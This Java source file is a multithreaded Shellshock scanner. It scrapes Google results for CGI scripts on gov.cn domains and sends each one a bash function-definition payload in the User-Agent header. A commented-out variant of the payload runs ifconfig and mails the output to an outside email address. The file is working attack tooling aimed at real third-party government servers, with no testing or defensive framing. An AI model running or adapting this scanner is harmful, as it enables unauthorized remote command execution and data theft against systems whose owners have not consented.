import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLDecoder;
import java.util.Queue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
 
import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
 
 
public class tttt extends Thread{
 
    Queue<String> strQeueu = new LinkedBlockingQueue<String>();
 
    public tttt(Queue<String> strQeueu){
        this.strQeueu = strQeueu;
    }
 
    public static String getResponse(String url) throws IOException{
        try {
            Connection.Response response = Jsoup.connect(url)
                    .userAgent("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0")
                    .referrer("http://www.google.com.hk/")
//                    .userAgent("() { :; }; ifconfig | mail -s test zabcbaz@126.com")
                    .userAgent("() {:; }; echo aaaaaaaaaaaaaaaaaa")
                    .ignoreHttpErrors(true)
                    .timeout(3000)
                    .execute();
            return response.body();
        } catch (IOException e) {
            throw e;
        }
    }
 
    public void run(){
        while(true){
            String str = strQeueu.poll();
            if(str == null){
                return ;
            }
            try {
                System.out.println("请求:"+ str + "\n" + getResponse(str));
            } catch (Exception e) {
            	System.out.print(str);
                System.err.println(e);
            }
        }
    }
 
    public static void main(String[] args) throws IOException {
    	String url_google = "https://www.google.ws/search?q=filetype:cgi+inurl:cgi-bin+site:gov.cn&num=100&newwindow=1&biw=1440&bih=710&ei=qpojVIrRIJPX8gWU_4GwDg&start=300&sa=N";
////    	String url_google = "http://www.youtube.com/";
//    	String url_google = "http://www.baidu.com/";
//    	
//    	URL url = new URL(url_google);
//        // 创建代理服务器
//		InetSocketAddress addr = new InetSocketAddress("192.168.200.136", 443);
////		 Proxy proxy = new Proxy(Proxy.Type.SOCKS, addr); // Socket 代理
//		Proxy proxy = new Proxy(Proxy.Type.HTTP, addr); // http 代理
//		// 如果我们知道代理server的名字, 可以直接使用
//		// 结束
////		URLConnection conn = url.openConnection(proxy);
//		URLConnection conn = url.openConnection();
//		BufferedReader in = new BufferedReader(
//				new InputStreamReader(conn.getInputStream()));
//		String sOut = "";
//		String buffer = null;
//		// InputStream in = url.openStream();
//		while((buffer = in.readLine()) != null){
//			sOut += buffer;
//		}
//		System.out.println(sOut);
//		
    	
        Document doc = Jsoup.connect(url_google).userAgent("Googlebot/2.1 (+http://www.googlebot.com/bot.html)").timeout(50000).get();
        Elements element = doc.getElementsByTag("h3");
        Queue<String> ls = new LinkedBlockingQueue<String>();
        for (Element e : element) {
            Matcher m= Pattern.compile("/url\\?q=(.*)&sa").matcher(e.getElementsByTag("a").get(0).attr("href"));
            if(m.find()){
                String url = URLDecoder.decode(m.group(1),"UTF-8");
                if(url.contains("cgi")){
                    ls.offer(url);
                }
            }
        }
        ThreadGroup tg = new ThreadGroup("cgi");
        System.out.println(ls.size());
        int threadCount = ls.size() > 10 ? 10 : ls.size();
        while (threadCount > 0) {
            for (int i = 0; i < threadCount; i++) {
                threadCount--;
                new Thread(tg, new tttt(ls)).start();
            }
            while (true) {
                if (tg.activeCount() == 0) {
                    break;
                }
            }
        }
    }
 
}
